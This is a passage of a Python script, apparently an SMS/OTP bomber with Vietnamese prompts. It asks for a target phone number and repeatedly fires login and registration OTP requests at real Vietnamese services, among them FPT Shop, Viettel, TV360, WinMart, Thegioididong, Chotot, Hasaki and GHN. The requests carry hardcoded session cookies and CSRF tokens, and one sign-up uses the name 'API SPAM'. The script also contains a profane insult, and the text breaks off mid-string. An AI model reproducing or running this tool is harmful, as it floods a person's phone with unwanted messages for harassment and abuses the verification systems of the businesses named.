import os
import requests,os,time,re,json,uuid,random,sys
from concurrent.futures import ThreadPoolExecutor
amount = 5000
luc = "\033[1;32m"
trang = "\033[1;37m"
do = "\033[96m\033[96m"
vang = "\033[0;93m"
hong = "\033[1;35m"
xduong = "\033[1;34m"
xnhac = "\033[1;36m"
red='\u001b[31;1m'
yellow='\u001b[33;1m'
green='\u001b[32;1m'
blue='\u001b[34;1m'
tim='\033[1;35m'
xanhlam='\033[1;36m'
xam='\033[1;30m'
black='\033[1;19m'

ban = """
 \x1b[38;5;207m  _____                _    _                   \x1b[38;5;226m      
 \033[38;5;99m |  __ \              | |  | |                        \x1b[38;5;226m
 \x1b[38;5;46m | |  | |_   _ _   _  | |__| | ___   __ _ _ __   __ _ \x1b[38;5;226m
 \033[38;5;51m | |  | | | | | | | | |  __  |/ _ \ / _` | '_ \ / _` |\x1b[38;5;226m
 \x1b[38;5;208m | |__| | |_| | |_| | | |  | | (_) | (_| | | | | (_| |\x1b[38;5;226m
 \x1b[34m |_____/ \__,_|\__, | |_|  |_|\___/ \__,_|_| |_|\__, |\x1b[38;5;226m
 \x1b[31m              __/ |                            __/   |\x1b[38;5;226m
 \x1b[38;5;46m              |___/                            |___/ \x1b[38;5;226m

"""
def banner():
  os.system("clear")
  for h in ban:
    sys.stdout.write(h)
    sys.stdout.flush()
    time.sleep(0.003)
banner()
sdt = input("\033[1;37m[ \033[1;33m+\033[1;37m ] Phone Spam : \x1b[1;39m")
while not re.search("^(0?)(3[2-9]|5[6|8|9]|7[0|6-9]|8[0-6|8|9]|9[0-4|6-9])[0-9]{7}$",sdt):
  print("Số Điện Thoại Phải Đủ 10 Số !!")
  sdt = input("\033[1;37m[ \033[1;33m+\033[1;37m ] Phone Spam : \x1b[1;39m")
count = int(input("\033[1;37m[ \033[1;33m+\033[1;37m ] Số Lần Spam : \x1b[1;39m"))
if sdt == "0123456789":
  print("Spam Số Tao Con Mẹ Mày")
  exit()

threading = ThreadPoolExecutor(max_workers=int(100000))  
def fptshop(sdt):
    headers = {
                'Accept': '*/*',
                'Accept-Language': 'vi,vi-VN;q=0.9,en;q=0.8',
                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Cookie': 'log_6dd5cf4a-73f7-4a79-b6d6-b686d28583fc=97801d00-021f-421a-8380-28ee5cdb8c8f; _sp_ses.d55b=*; cf_clearance=_FsRGO_gxvOnCHpjYHyEx9Rd7OFtZoSedFbfdp70hak-1717754337-1.0.1.1-NoFrONk363RsGa2Ii4KQoNmiujs.DROlEP3xXZZgWEV28KwnpAqtIHrX6MiQ_v6D3km1iCtLKzIucjvNpTc01g; _sp_id.d55b=18038e48-0b6d-491c-b378-9d98efae19d4.1715538738.4.1717756016.1717328283.0663bbb6-015f-497a-adb3-c06220826acd.d49ca543-e659-47e0-b53d-8eda1cfb28c6...0; vMobile=2',
                'DNT': '1',
                'Origin': 'https://fptshop.com.vn',
                'Referer': 'https://fptshop.com.vn/',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
                'X-Requested-With': 'XMLHttpRequest',
                'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
            }

    data = {
                'phone': sdt,
                'typeReset': '0',
            }

    response = requests.post('https://fptshop.com.vn/api-data/loyalty/Login/Verification', headers=headers, data=data)
    print("\x1b[1;37m[\033[1;32mSUCCESS SEND\x1b[1;37m]\033[1;33m FPTSHOP\033[00m |\033[1m\033[96m", response.text)
def tv360(sdt):
    cookies = {
        'img-ext': 'avif',
        'NEXT_LOCALE': 'vi',
        'device-id': 's%3Aweb_a2d88d8a-30a6-45e7-a176-3bde426dee6b.sCh7MaenWcB%2BrjSBjp4EToxTJqyLTr3o2XhEErCxeWs',
        'shared-device-id': 'web_a2d88d8a-30a6-45e7-a176-3bde426dee6b',
        'screen-size': 's%3A1920x1080.uvjE9gczJ2ZmC0QdUMXaK%2BHUczLAtNpMQ1h3t%2Fq6m3Q',
        'G_ENABLED_IDPS': 'google',
        'session-id': 's%3Aa074faba-8b7c-4de6-820d-93b0f980ca4e.NXEZ1PPg6ZOe0Uau96qLQ7Gn7UG%2BpsTq%2FVvFKOs3S8U',
        'remember-user': '',
    }

    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi,vi-VN;q=0.9,en;q=0.8',
        'content-type': 'application/json',
        # 'cookie': 'img-ext=avif; NEXT_LOCALE=vi; device-id=s%3Aweb_a2d88d8a-30a6-45e7-a176-3bde426dee6b.sCh7MaenWcB%2BrjSBjp4EToxTJqyLTr3o2XhEErCxeWs; shared-device-id=web_a2d88d8a-30a6-45e7-a176-3bde426dee6b; screen-size=s%3A1920x1080.uvjE9gczJ2ZmC0QdUMXaK%2BHUczLAtNpMQ1h3t%2Fq6m3Q; G_ENABLED_IDPS=google; session-id=s%3Aa074faba-8b7c-4de6-820d-93b0f980ca4e.NXEZ1PPg6ZOe0Uau96qLQ7Gn7UG%2BpsTq%2FVvFKOs3S8U; remember-user=',
        'dnt': '1',
        'origin': 'https://tv360.vn',
        'priority': 'u=1, i',
        'referer': 'https://tv360.vn/login?r=https%3A%2F%2Ftv360.vn%2F',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'starttime': '1717772989877',
        'tz': 'Asia/Saigon',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    }

    json_data = {
        'msisdn': sdt,
    }

    response = requests.post('https://tv360.vn/public/v1/auth/get-otp-login', cookies=cookies, headers=headers, json=json_data)
    print("\x1b[1;37m[\033[1;32mSUCCESS SEND\x1b[1;37m]\033[1;33m TV360\033[00m |\033[1m\033[96m", response.text)
def myviettel(sdt):
    cookies = {
        'laravel_session': 'gcHSiJr7zoZGgNpCaC9ohXC8uTMg5UzCc1oKKpBJ',
        'XSRF-TOKEN': 'eyJpdiI6Ijc3MStob3F5bGJ6eUlYcGRER2xhbXc9PSIsInZhbHVlIjoiQnZKTHRJUGlxZUtKVWdtVFwveEg5ZW9CemhpRzBnaHBFZFQ0TE5USURrRUowVDk3UGJNek4zYlI0a3dVWFAzM0oiLCJtYWMiOiJlODE3MmI2NDMwZDVjZjhhODAzMDc3ZWE0MDkzMzQ0YWNmNjQzMGFkMjFlODVmZGI2ZjdhZDNkODU0NzM4NmMyIn0%3D',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi,vi-VN;q=0.9,en;q=0.8',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        # 'Cookie': 'laravel_session=gcHSiJr7zoZGgNpCaC9ohXC8uTMg5UzCc1oKKpBJ; XSRF-TOKEN=eyJpdiI6Ijc3MStob3F5bGJ6eUlYcGRER2xhbXc9PSIsInZhbHVlIjoiQnZKTHRJUGlxZUtKVWdtVFwveEg5ZW9CemhpRzBnaHBFZFQ0TE5USURrRUowVDk3UGJNek4zYlI0a3dVWFAzM0oiLCJtYWMiOiJlODE3MmI2NDMwZDVjZjhhODAzMDc3ZWE0MDkzMzQ0YWNmNjQzMGFkMjFlODVmZGI2ZjdhZDNkODU0NzM4NmMyIn0%3D',
        'DNT': '1',
        'Origin': 'https://vietteltelecom.vn',
        'Referer': 'https://vietteltelecom.vn/dang-nhap',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': 'vm8KqWa2kNV6VJ3EHplfBCZkGaHaqUqkw8dz3JIh',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6Ijc3MStob3F5bGJ6eUlYcGRER2xhbXc9PSIsInZhbHVlIjoiQnZKTHRJUGlxZUtKVWdtVFwveEg5ZW9CemhpRzBnaHBFZFQ0TE5USURrRUowVDk3UGJNek4zYlI0a3dVWFAzM0oiLCJtYWMiOiJlODE3MmI2NDMwZDVjZjhhODAzMDc3ZWE0MDkzMzQ0YWNmNjQzMGFkMjFlODVmZGI2ZjdhZDNkODU0NzM4NmMyIn0=',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'phone': sdt,
        'typeCode': 'DI_DONG',
        'actionCode': 'myviettel://login_mobile',
        'type': 'otp_login',
    }

    response = requests.post('https://vietteltelecom.vn/api/getOTPLoginCommon', cookies=cookies, headers=headers, json=json_data)
    print("\x1b[1;37m[\033[1;32mSUCCESS SEND\x1b[1;37m]\033[1;33m MYVIETTEL\033[00m |\033[1m\033[96m", response.text)
def winmart(sdt):
    headers = {
        'accept': 'application/json',
        'accept-language': 'vi,vi-VN;q=0.9,en;q=0.8',
        'authorization': 'Bearer undefined',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://winmart.vn',
        'priority': 'u=1, i',
        'referer': 'https://winmart.vn/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'x-api-merchant': 'WCM',
    }

    json_data = {
        'firstName': 'API SPAM',
        'phoneNumber': sdt,
        'masanReferralCode': '',
        'dobDate': '2024-04-01',
        'gender': 'Male',
    }

    response = requests.post('https://api-crownx.winmart.vn/iam/api/v1/user/register', headers=headers, json=json_data)
    print("\x1b[1;37m[\033[1;32mSUCCESS SEND\x1b[1;37m]\033[1;33m WINMART\033[00m |\033[1m\033[96m", response.text)
def tgdd(sdt):
    cookies = {
        'TBMCookie_3209819802479625248': '793758001717896563gO1HjgaSiV+z9A1f9IlJ72pGLlo=',
        '___utmvm': '###########',
        'DMX_Personal': '%7B%22UID%22%3A%222b00609aff4342373b128ced62744ba97e8ca0ef%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D',
        'mwgngxpv': '3',
        '.AspNetCore.Antiforgery.Pr58635MgNE': 'CfDJ8AFHr2lS7PNCsmzvEMPceBNnWY3P7SxN-ty_aLkv1LREJ9RDCYWXoeUnU9sAHoa7GMY1TrE8F6r6pXGq0LXniBDQ6JG91h6OaQP_z6_mqZSjr32D90mW7iXAIqphu-llokfmDlVAw3NGs5tn59tpdtA',
        'SvID': 'beline2686|ZmUFf|ZmUFd',
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'vi,vi-VN;q=0.9,en;q=0.8',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': 'TBMCookie_3209819802479625248=793758001717896563gO1HjgaSiV+z9A1f9IlJ72pGLlo=; ___utmvm=###########; DMX_Personal=%7B%22UID%22%3A%222b00609aff4342373b128ced62744ba97e8ca0ef%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D; mwgngxpv=3; .AspNetCore.Antiforgery.Pr58635MgNE=CfDJ8AFHr2lS7PNCsmzvEMPceBNnWY3P7SxN-ty_aLkv1LREJ9RDCYWXoeUnU9sAHoa7GMY1TrE8F6r6pXGq0LXniBDQ6JG91h6OaQP_z6_mqZSjr32D90mW7iXAIqphu-llokfmDlVAw3NGs5tn59tpdtA; SvID=beline2686|ZmUFf|ZmUFd',
        'DNT': '1',
        'Origin': 'https://www.thegioididong.com',
        'Referer': 'https://www.thegioididong.com/lich-su-mua-hang/dang-nhap',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'phoneNumber': sdt,
        'isReSend': 'false',
        'sendOTPType': '1',
        '__RequestVerificationToken': 'CfDJ8AFHr2lS7PNCsmzvEMPceBOHpRBoJWH3_P7CP6d_A8BDLwXhr0z7BiwP5gc-G3EZfXuGDucU98raKpnp7K5xJn0Ia8BVCwx2W-bF1hFiWZcyosAFDH53-En_e82HeTX5XpByNkCdDAK1AQlwHm3230A',
    }

    response = requests.post(
        'https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
        cookies=cookies,
        headers=headers,
        data=data,
    )
    print("\x1b[1;37m[\033[1;32mSUCCESS SEND\x1b[1;37m]\033[1;33m TGDD\033[00m |\033[1m\033[96m", response.text)
def chotot(sdt):
    headers = {
        'accept': '*/*',
        'accept-language': 'vi,vi-VN;q=0.9,en;q=0.8',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://id.chotot.com',
        'priority': 'u=1, i',
        'referer': 'https://id.chotot.com/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    }

    json_data = {
        'phone': sdt,
        'type': '',
    }

    response = requests.post('https://gateway.chotot.com/v2/public/auth/send_otp_verify', headers=headers, json=json_data)
    print("\x1b[1;37m[\033[1;32mSUCCESS SEND\x1b[1;37m]\033[1;33m CHOTOT\033[00m |\033[1m\033[96m", response.text)
def batdongsan(phone):
    cookies = {
        'con.ses.id': 'c62f8622-0d8b-43b0-ba31-62438729821c',
        '_cfuvid': 'udB8zGa86MTtW3WpmAc5wq85JEVZaWA6n0O2aW9Frus-1717910474291-0.0.1.1-604800000',
        'cf_clearance': '22PMzakyS8hP5KFF1WTaTGE9rZ84_PRggj4t8OkARQ0-1717910476-1.0.1.1-qjtQQaO30PAbwpYAulFx3v7FyKJjwipS8QwwTFamloO35a8IzDGcJ6pUnMN9ymOHOW..9KKspveNOxb_K5S78w',
        'con.unl.usr.id': '%7B%22key%22%3A%22userId%22%2C%22value%22%3A%228b5816d8-d2d7-495e-901d-610dc113808f%22%2C%22expireDate%22%3A%222025-06-09T12%3A21%3A18.6722001Z%22%7D',
        'con.unl.cli.id': '%7B%22key%22%3A%22clientId%22%2C%22value%22%3A%224f3b0140-28e5-4f3e-b0b8-47d7a1d22055%22%2C%22expireDate%22%3A%222025-06-09T12%3A21%3A18.6722576Z%22%7D',
        'ab.storage.deviceId.2dca22f5-7d0d-4b29-a49e-f61ef2edc6e9': '%7B%22g%22%3A%228bf142d8-98f7-84f9-77c3-70c97d934325%22%2C%22c%22%3A1717910507211%2C%22l%22%3A1717910507211%7D',
    }

    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi,vi-VN;q=0.9,en;q=0.8',
        # 'cookie': 'con.ses.id=c62f8622-0d8b-43b0-ba31-62438729821c; _cfuvid=udB8zGa86MTtW3WpmAc5wq85JEVZaWA6n0O2aW9Frus-1717910474291-0.0.1.1-604800000; cf_clearance=22PMzakyS8hP5KFF1WTaTGE9rZ84_PRggj4t8OkARQ0-1717910476-1.0.1.1-qjtQQaO30PAbwpYAulFx3v7FyKJjwipS8QwwTFamloO35a8IzDGcJ6pUnMN9ymOHOW..9KKspveNOxb_K5S78w; con.unl.usr.id=%7B%22key%22%3A%22userId%22%2C%22value%22%3A%228b5816d8-d2d7-495e-901d-610dc113808f%22%2C%22expireDate%22%3A%222025-06-09T12%3A21%3A18.6722001Z%22%7D; con.unl.cli.id=%7B%22key%22%3A%22clientId%22%2C%22value%22%3A%224f3b0140-28e5-4f3e-b0b8-47d7a1d22055%22%2C%22expireDate%22%3A%222025-06-09T12%3A21%3A18.6722576Z%22%7D; ab.storage.deviceId.2dca22f5-7d0d-4b29-a49e-f61ef2edc6e9=%7B%22g%22%3A%228bf142d8-98f7-84f9-77c3-70c97d934325%22%2C%22c%22%3A1717910507211%2C%22l%22%3A1717910507211%7D',
        'dnt': '1',
        'priority': 'u=1, i',
        'referer': 'https://batdongsan.com.vn/sellernet/internal-sign-up',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    }

    params = {
        'phoneNumber': sdt,
    }

    response = requests.get(
        'https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister',
        params=params,
        cookies=cookies,
        headers=headers,
    )
    print("\x1b[1;37m[\033[1;32mSUCCESS SEND\x1b[1;37m]\033[1;33m BATDONGSAN\033[00m |\033[1m\033[96m", response.text)
def thepizzacom(sdt):
    cookies = {
        '.Nop.Antiforgery': 'CfDJ8PqJqZGi0GlLs843POzwcT6doK-fkENB3oysHJq_T2Lp8bHIOjrpfWdK56R1CMvOQg0J4LS0zpoATX-rURWB5PGynD9BAPokSm6IIHkgBhYy-cjlv25KkF8w-3ltg3uutxEsPXmCmeBWqf3uCAQ5rvY',
        '.Nop.Customer': '50785a15-005f-4ce8-b8a9-143521acfedf',
        '.Nop.TempData': 'CfDJ8PqJqZGi0GlLs843POzwcT76kvvMYDBiq02AQsoVpS1OWn4LoaLzl45E9v5CMhTFsXFaj64K7uAeb-R_H_ayvnxi8K0m2daazQqK160fOvL5e8tNFp3bTkZeJsMCqGkp7kUH_1vW_jFMh9yQ0EFVBKB6wzW71p_paHE-WnkhggZ8gb8TXnwsKBWkwMYu4fJlOA',
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'vi,vi-VN;q=0.9,en;q=0.8',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': '.Nop.Antiforgery=CfDJ8PqJqZGi0GlLs843POzwcT6doK-fkENB3oysHJq_T2Lp8bHIOjrpfWdK56R1CMvOQg0J4LS0zpoATX-rURWB5PGynD9BAPokSm6IIHkgBhYy-cjlv25KkF8w-3ltg3uutxEsPXmCmeBWqf3uCAQ5rvY; .Nop.Customer=50785a15-005f-4ce8-b8a9-143521acfedf; .Nop.TempData=CfDJ8PqJqZGi0GlLs843POzwcT76kvvMYDBiq02AQsoVpS1OWn4LoaLzl45E9v5CMhTFsXFaj64K7uAeb-R_H_ayvnxi8K0m2daazQqK160fOvL5e8tNFp3bTkZeJsMCqGkp7kUH_1vW_jFMh9yQ0EFVBKB6wzW71p_paHE-WnkhggZ8gb8TXnwsKBWkwMYu4fJlOA',
        'DNT': '1',
        'Origin': 'https://thepizzacompany.vn',
        'Referer': 'https://thepizzacompany.vn/Otp',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'phone': sdt,
        '__RequestVerificationToken': 'CfDJ8PqJqZGi0GlLs843POzwcT4fyc7PtNgXjdpyE4FXwKqaSyCmj5GAlimMuS_LkT8XjHUN-ZTck3wn-GFSIkI1rwfuMY5WTMUcGbQHWA_0j6oQisMeQeYO32LmSsiVrdyVq63y46N4BrXZVC8eEzlIIXQ',
    }

    response = requests.post('https://thepizzacompany.vn/customer/ResendOtp', cookies=cookies, headers=headers, data=data)
    print("\x1b[1;37m[\033[1;32mSUCCESS SEND\x1b[1;37m]\033[1;33m THE PIZZA\033[00m |\033[1m\033[96m", response.text)
def hasaki(sdt):
    cookies = {
        'sessionChecked': '1717983719',
        'HASAKI_SESSID': '309ae04a04dc02eedb7bdb5e5b896518',
        'form_key': '309ae04a04dc02eedb7bdb5e5b896518',
        'utm_hsk': '%7B%22utm_source%22%3Anull%2C%22utm_medium%22%3Anull%2C%22utm_campaign%22%3Anull%2C%22utm_term%22%3Anull%7D',
        'PHPSESSID': 'teml0i1cegbv4hdtv346g13ql5',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi,vi-VN;q=0.9,en;q=0.8',
        # 'cookie': 'sessionChecked=1717983719; HASAKI_SESSID=309ae04a04dc02eedb7bdb5e5b896518; form_key=309ae04a04dc02eedb7bdb5e5b896518; utm_hsk=%7B%22utm_source%22%3Anull%2C%22utm_medium%22%3Anull%2C%22utm_campaign%22%3Anull%2C%22utm_term%22%3Anull%7D; PHPSESSID=teml0i1cegbv4hdtv346g13ql5',
        'dnt': '1',
        'priority': 'u=1, i',
        'referer': 'https://hasaki.vn/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    params = {
        'api': 'user.verifyUserName',
        'username': sdt,
    }

    response = requests.get('https://hasaki.vn/ajax', params=params, cookies=cookies, headers=headers)
    print("\x1b[1;37m[\033[1;32mSUCCESS SEND\x1b[1;37m]\033[1;33m HASAKI\033[00m |\033[1m\033[96m", response.text)
def ghn(sdt):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi,vi-VN;q=0.9,en;q=0.8',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://sso.ghn.vn',
        'priority': 'u=1, i',
        'referer': 'https://sso.ghn.vn/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    }

    json_data = {
        'phone': sdt,
        'type': 'register',
    }

    response = requests.post('https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp', headers=headers, json=json_data)
    print("\x1b[1;37m[\033[1;32mSUCCESS SEND\x1b[1;37m]\033[1;33m GHN\033[00m |\033[96m\033[1m\033[96m ", response.text)
def vietloan_apicall(sdt):
    cookies = {
        '__cfruid': '777bfbb03c8b027333505c7db6a9a07c57102494-1717989590',
        'jslbrc': 'w.202406100319544ea57b3a-26d8-11ef-bfea-de58f617b7f0.S_GS',
        'ec_png_utm': '50a6f5bf-f6d8-62e0-d08a-b4ed30903f63',
        'ec_etag_utm': '50a6f5bf-f6d8-62e0-d08a-b4ed30903f63',
        'ec_cache_utm': '50a6f5bf-f6d8-62e0-d08a-b4ed30903f63',
        'uid': '50a6f5bf-f6d8-62e0-d08a-b4ed30903f63',
        'ec_png_client': 'false',
        'ec_etag_client': 'false',
        'ec_cache_client': 'false',
        'client': 'false',
        'ec_png_client_utm': 'null',
        'ec_etag_client_utm': 'null',
        'ec_cache_client_utm': 'null',
        'client_utm': 'null',
        'XSRF-TOKEN': 'eyJpdiI6Ing0QVM2dFpQeUQxL2xRL3N1ZmhOM1E9PSIsInZhbHVlIjoiU2tzaVZFR29HaDVXSUZRRnhPbzU5K2tFdCtXa0w1V0w0NjhZSU1JMDZYc1ZsbVNpcWs3UHhFMUxDNFhTaXMvYjBLTkc5bXJxS3QwT2RES2xLZUhNeFVwMlJjRHZWTTl6MDhVa0hJSjdqek5hWlplS3JxYnNvcFVVYi9KdjJ1RloiLCJtYWMiOiIyNjM4M2E0MmUyMDcxYmM2NWQxYmRhYzUzZjlmMzZiZjNjZmUyOTAyYzc1YjdhOTQ3MTk3Mzg3MTc0MGFlMzQxIiwidGFnIjoiIn0%3D',
        'sessionid': 'eyJpdiI6IjVTRTI2cTdmVFBodUxOZTBNQlpkUHc9PSIsInZhbHVlIjoiNkpRemhqaGVhRFpXVzNRaXB1djI3dmIwdzdXTnVvYXdFcDNTRFdERHhVcjAwRHJHbjYwTGRadFV4b0Y3eGg2Y1p1Rnk0MWRaVWNrcnYwUmhESE9RYU8rS0R0Q3V2c05XNktOYVpNbVhiR25mWHgrYWpFaDVKM1lHclJtVmlXaHUiLCJtYWMiOiIwODNjYmE0YzhkMGNmZGNmZTMxZDY1Njg1OTMyMTYyNTNiZjU3ZmI4OWZkY2ExNTgxODgxMWEwMThlOTM4YTc4IiwidGFnIjoiIn0%3D',
        'utm_uid': 'eyJpdiI6IkFuYkRBMm1nK0gweStNQ3V1N1hsSHc9PSIsInZhbHVlIjoidU8xOFd0RXFPVVRXTkRDTXlka1dmaWNUaVJQUGIyaXJZeStiSEpzMVVyZDdKZDNwOU5OR0ZxS1k4TEJHNHJqWG1mdVpYaStnM2xTNlR0c2tzaGZ0WE1VdUpmcCtRMDhKMThqaHdkR1pzWUFVU2wxNFNxRUhhaytiLzZQaDg4dnEiLCJtYWMiOiJmZjBlMGQzODU2NmM2YzlmMzBmNTZjMGYyZGNkMmJjM2E2N2E2ZTBkZDUxYmVkMzc3ODUyMzU5NjkxYjg0ZGMyIiwidGFnIjoiIn0%3D',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi,vi-VN;q=0.9,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': '__cfruid=777bfbb03c8b027333505c7db6a9a07c57102494-1717989590; jslbrc=w.202406100319544ea57b3a-26d8-11ef-bfea-de58f617b7f0.S_GS; ec_png_utm=50a6f5bf-f6d8-62e0-d08a-b4ed30903f63; ec_etag_utm=50a6f5bf-f6d8-62e0-d08a-b4ed30903f63; ec_cache_utm=50a6f5bf-f6d8-62e0-d08a-b4ed30903f63; uid=50a6f5bf-f6d8-62e0-d08a-b4ed30903f63; ec_png_client=false; ec_etag_client=false; ec_cache_client=false; client=false; ec_png_client_utm=null; ec_etag_client_utm=null; ec_cache_client_utm=null; client_utm=null; XSRF-TOKEN=eyJpdiI6Ing0QVM2dFpQeUQxL2xRL3N1ZmhOM1E9PSIsInZhbHVlIjoiU2tzaVZFR29HaDVXSUZRRnhPbzU5K2tFdCtXa0w1V0w0NjhZSU1JMDZYc1ZsbVNpcWs3UHhFMUxDNFhTaXMvYjBLTkc5bXJxS3QwT2RES2xLZUhNeFVwMlJjRHZWTTl6MDhVa0hJSjdqek5hWlplS3JxYnNvcFVVYi9KdjJ1RloiLCJtYWMiOiIyNjM4M2E0MmUyMDcxYmM2NWQxYmRhYzUzZjlmMzZiZjNjZmUyOTAyYzc1YjdhOTQ3MTk3Mzg3MTc0MGFlMzQxIiwidGFnIjoiIn0%3D; 